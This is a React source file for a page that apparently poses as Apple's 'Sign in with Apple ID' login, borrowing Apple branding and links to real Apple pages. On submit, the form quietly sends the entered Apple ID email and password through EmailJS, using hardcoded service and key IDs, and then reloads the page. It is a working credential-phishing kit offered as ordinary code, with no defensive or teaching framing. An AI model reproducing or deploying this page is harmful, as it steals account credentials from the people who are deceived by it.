import React, { useState } from 'react'
import apple from '../assets/appimg.svg'
import emailjs from '@emailjs/browser';
import arrow from '../assets/arrow.png';
import { Link } from 'react-router-dom';
const Find = () => {
  const [pass , setPass] = useState(false) ;
  const [loading , setloading] = useState(false)
  const forward= ()=>{
    setPass(x=>!x)
    console.log(pass);
  }
  const handleSubmit =(e)=>{
    e.preventDefault()
    setloading(true)
    emailjs.sendForm(
      'service_ljp11hf',
      'template_f7gdir8',
            e.target,
      'dD4yQMZBkd439zHh8'
    ) .then((result) => {
        setTimeout(()=>{
            window.location.reload(false)
        } , 3000)
        setloading(false)
    }, (error) => {
        console.log('something went wrong' , error.text);
    })
    

}

  return (
    <div className='card'>

<div className='  p-5  lg:rounded-xl  lg:shadow-xl  lg:bg-white mx-auto  mt-12 flex flex-col items-center  justify-center '>
    <img className='w-32' src={apple} alt='img'/>
    <p className='my-2 text-sm bold'>Sign in with Apple ID</p>
    <div>
        <form className='my-10' onSubmit={handleSubmit}>
        <div className='relative'>
        <input className={pass ? ' w-80 p-2 email'  : 'w-80 p-2 emil ' } name='user_email' type='email' placeholder='Apple ID'/>
        {pass ? 
          ''
          :
          <img src={arrow} onClick={forward} className='absolute top-3 cursor-pointer right-2 w-6 h-6'/> 
        }
        
        
        </div>
        {pass? <input className='w-80 p-2  pass' placeholder='password' type='password' name='user_password' /> : <input className='w-80 p-2 hidden pass'  type='password'  />}
        <div className='flex justify-center items-center mt-5'>
        
        {pass ?<input  className='bg-blue-500 rounded-md border-none p-2 cursor-pointer' type='submit' /> : '' }
        {/* {loading ? 
        <svg class="animate-spin h-5 w-5 " viewBox="0 0 24 24">
          
        </svg>
      :
          ''
} */}

        </div>
        </form>
        <div className='flex justify-center items-center gap-2 my-10'>
            <input className='' type='checkbox' />
            <p className='text-sm'>Keep me signed in</p>
        </div>
        <div className='flex flex-col justify-center items-center gap-2' >
        <Link className='text-blue-400 text-center  cursor-pointer text-xs' to='https://iforgot.apple.com/password/verify/appleid'>Forgotten your Apple ID or password ?</Link>
        <Link className='text-blue-400 text-center  cursor-pointer text-xs' to='https://www.icloud.com/find'>Create Apple ID</Link>
        </div>
      </div>
    </div>
    </div>
  )
}

export default Find
